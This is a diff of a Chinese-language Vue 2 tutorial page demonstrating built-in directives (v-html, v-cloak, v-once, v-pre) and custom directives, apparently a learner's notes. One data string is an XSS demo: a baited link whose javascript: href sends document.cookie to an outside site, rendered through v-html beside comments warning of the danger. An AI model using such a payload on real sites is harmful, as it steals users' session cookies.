@@ -4,11 +4,35 @@
     <meta charset="UTF-8">
     <title>内置指令</title>
     <script type="text/javascript" src="../js/vue.js"></script>
+    <style>
+        /*选中所有标签中有v-clock属性的元素*/
+        [v-clock]{
+            display: none;
+        }
+    </style>
 </head>
 <body>
     <div id="root">
         <h2>{{name}}</h2>
         <h2 v-text="name">xi</h2>
+        <h2 v-text="str">xi</h2>
+        <h2 v-html="str2"></h2>
+        <h2 v-cloak>{{name}}</h2>
+        <h2>当前的n值是：{{n}}<button @click="n++">点我n+1</button></h2>
+        <h2 v-once>初始化时的n值：{{n}}</h2>
+        <h2 v-pre>当前的n值是：{{n}}<button>点我n+1</button></h2>
+        <!--自定义指令-->
+        <!--1：v-big,和v-text相似，但是放大元素10倍-->
+        <!--2：v-fbind,和v-bind相似，但是可以让其绑定的input元素默认获取焦点-->
+        <h2>当前的n值是：<span v-text="n"></span></h2>
+        <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
+        <h2>放大10倍后的n值是：<span v-big-number="n"></span></h2>
+        <button @click="n++">点我n+1</button>
+        <hr>
+        <input type="text" :value="n">
+        <input type="text" v-fbind:value="n">
+        <input type="text" v-ffbind:value="n">
+        <h2>放大10倍后的n值是：<span v-pss="n"></span></h2>
     </div>
 <script>
     /*
@@ -23,15 +47,124 @@
     *   v-text:
     *       1:作用：向其所在的节点中渲染文本内容
     *       2：与插值语法的区别：v-text会替换掉节点中的内容，{{xxx}}则不会
+    *   v-html
+    *       1：作用：向指定节点中渲染包含html结构的内容
+    *       2：与插值语法的区别：
+    *           1：v-html会替换掉节点中所有的内容，{{xxx}}不会
+    *           2：v-html可以识别html结构
+    *       3：严重注意，v-html有安全性问题
+    *           1：在网站上动态渲染任意html是非常危险的，容易导致xss（冒充用户之手）攻击
+    *           2：一定要在可信的内容上使用v-html,永远不要再用户提交的内容上
+    *   v-cloak(没有值)
+    *       1：本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删除掉v-clock属性
+    *       2：使用css配合v-clock可以解决网速慢时页面展示出{{xxx}}的问题
+    *   v-once(没有值)
+    *       1：v-once所在节点在初次动态渲染后，就视为静态内容了
+    *       2：以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
+    *   v-pre指令
+    *       1：跳过其所在节点的编译过程
+    *       2：可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+    *
+    *   自定义指令总结
+    *       1：定义语法
+    *           1：局部指令：new Vue({ directives:{指令名：配置对象}})或 new Vue({  directives:{xxxfunction(){}}})
+    *           2：全局指令：Vue.directive(指令名，配置对象),或 Vue.directive(指令名，回调函数)
+    *       2：配置对象中常用的三个回调：
+    *           1：bind:指令与元素成功绑定时调用
+    *           2：inserted:指令所在元素被插入页面时调用
+    *           3：update:指令所在模板结构被重新解析时调用
+    *       3：备注：
+    *           1:指令定义时不加v-,但使用时要加v-
+    *           2:指令名如果是多个单词，要使用kebab-case命名方式（user-name），不要用camelCase命名(userName)
+    *
+    *
+    *
+    *
+    *
+    *
+    *
     * */
 
     Vue.config.productionTip=false;
-    const vm=new Vue({
-        el:'#root',
-        data:{
-            name:'安徽广德'
+    /*全局指令*/
+    Vue.directive('ffbind',{
+        bind(element,binding){
+            console.log('bind',this);
+            element.value=binding.value;//绑定元素的值
+        },
+        //指令所在元素被插入页面时，调用
+        inserted(element,binding){
+            console.log('inserted',this);
+            element.focus();//获取焦点
+        },
+        //指令所在的模板被重新解析时调用
+        update(element,binding){
+            console.log('update',this);
+            element.value=binding.value;//绑定元素的值
         }
     });
+    Vue.directive('pss',function(element,binding){
+        console.log(element instanceof HTMLElement);//a是一个真实的dom,是HTML元素的实例
+        console.dir(element);
+        console.log(binding.value);//绑定对象的值
+        console.log('big',this);
+        element.innerText=binding.value*10
+    })
+    const vm=new Vue({
+        //el:'#root',
+        data:{
+            name:'安徽广德',
+            str:'<h2>www</h2>',
+            str2:'<a  href=javascript:location.href="https://www.baidu.com?"+document.cookie   >兄弟，我找到你想要的资源了，快来</a>',
+            n:1,
+        },
+        /*自定义指令，，函数式和对象两种方法，与之前简写类似*/
+        /*局部指令*/
+        directives:{//内部的this指向的都是window
+            //big函数何时会被调用：1：指令与元素成功绑定时会被调用（一上来）  2：指令所在的模板被重新解析时会被调用
+            big(element,binding){//这种简写形式就是只集成了bind和update（以为bind和update的内容基本上是一致的）,没有写insert
+                console.log(element instanceof HTMLElement);//a是一个真实的dom,是HTML元素的实例
+                console.dir(element);
+                console.log(binding.value);//绑定对象的值
+                console.log('big',this);
+                element.innerText=binding.value*10
+            },
+            'big-number':function(element,binding){//这种简写形式就是只集成了bind和update（以为bind和update的内容基本上是一致的）,没有写insert
+                console.log(element instanceof HTMLElement);//a是一个真实的dom,是HTML元素的实例
+                console.dir(element);
+                console.log(binding.value);//绑定对象的值
+                element.innerText=binding.value*10
+            },
+            //上面的简写形式
+            'big-number'(element,binding){//这种简写形式就是只集成了bind和update（以为bind和update的内容基本上是一致的）,没有写insert
+                console.log(element instanceof HTMLElement);//a是一个真实的dom,是HTML元素的实例
+                console.dir(element);
+                console.log(binding.value);//绑定对象的值
+                element.innerText=binding.value*10
+            },
+            //
+            fbind:{//他们都属于钩子函数
+                //指令与元素成功绑定时会被调用（一上来）
+                bind(element,binding){
+                    console.log('bind',this);
+                    element.value=binding.value;//绑定元素的值
+                },
+                //指令所在元素被插入页面时，调用
+                inserted(element,binding){
+                    console.log('inserted',this);
+                    element.focus();//获取焦点
+                },
+                //指令所在的模板被重新解析时调用
+                update(element,binding){
+                    console.log('update',this);
+                    element.value=binding.value;//绑定元素的值
+                }
+            }
+        }
+    });
+    setTimeout(()=>{
+        vm.$mount("#root");
+    },3000)
 </script>
 </body>
 </html>
